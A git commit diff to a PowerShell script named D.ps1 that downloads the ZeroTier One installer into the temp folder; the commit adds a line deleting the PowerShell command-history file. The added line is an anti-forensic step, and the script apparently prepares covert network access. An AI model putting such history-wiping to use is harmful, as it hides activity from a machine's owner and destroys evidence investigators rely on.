bfb6c10411defde32792a110b752a9f3ab721c67
al0nks1337 <al0nks1337@gmail.com>
2025-05-01 14:13:53 +0000

    Update D.ps1

--- D.ps1
+++ D.ps1
@@ -1,4 +1,5 @@
 Clear-Host
+Remove-Item (Get-PSReadlineOption).HistorySavePath
 $msiPath = "$env:TEMP\ZeroTierOne.msi"
 Invoke-WebRequest -Uri 'https://download.zerotier.com/dist/ZeroTier%20One.msi' -OutFile $msiPath -UseBasicParsing
 if ((Test-Path $msiPath) -and ((Get-Item $msiPath).Length -gt 100000)) {
